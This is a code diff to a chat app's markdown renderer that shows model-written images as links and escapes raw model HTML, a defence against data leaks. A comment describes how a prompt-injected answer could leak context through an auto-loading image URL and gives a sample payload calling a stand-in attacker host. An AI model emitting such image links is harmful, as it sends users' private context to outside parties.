@@ -159,11 +159,22 @@ export default {
     return `<a href="${sanitizedHref}"${titleAttr} target="_blank" rel="noopener noreferrer" class="underline underline-offset-4 text-foreground">${text}</a>`;
   },
 
+  // Rendered as a link, never an <img>: an auto-loading image lets a prompt-injected answer
+  // exfiltrate context via its URL (`![](https://attacker/?q=secret)`) with no user click.
   image({ href, title, text }) {
-    const sanitizedSrc = sanitizeHref(href) ?? "#";
-    const escapedAlt = escapeHtml(text);
+    const sanitizedHref = sanitizeHref(href) ?? "#";
+    const escapedText = escapeHtml(text || href);
     const escapedTitle = title ? escapeHtml(title) : "";
     const titleAttr = escapedTitle ? ` title="${escapedTitle}"` : "";
-    return `<img src="${sanitizedSrc}" alt="${escapedAlt}"${titleAttr} class="h-64 rounded" />`;
+    return `<a href="${sanitizedHref}"${titleAttr} target="_blank" rel="noopener noreferrer" class="underline underline-offset-4 text-foreground">${escapedText}</a>`;
+  },
+
+  // Raw HTML from the model is shown as text, so the only real tags in the output are the ones
+  // this renderer emits. DOMPurify in parseMarkdown remains the second, independent layer.
+  html({ text, block }) {
+    const escapedText = escapeHtml(text);
+    return block
+      ? `<p class="whitespace-pre-wrap break-words text-base [&:not(:last-child)]:mb-2">${escapedText}</p>`
+      : escapedText;
   },
 } as RendererObject;
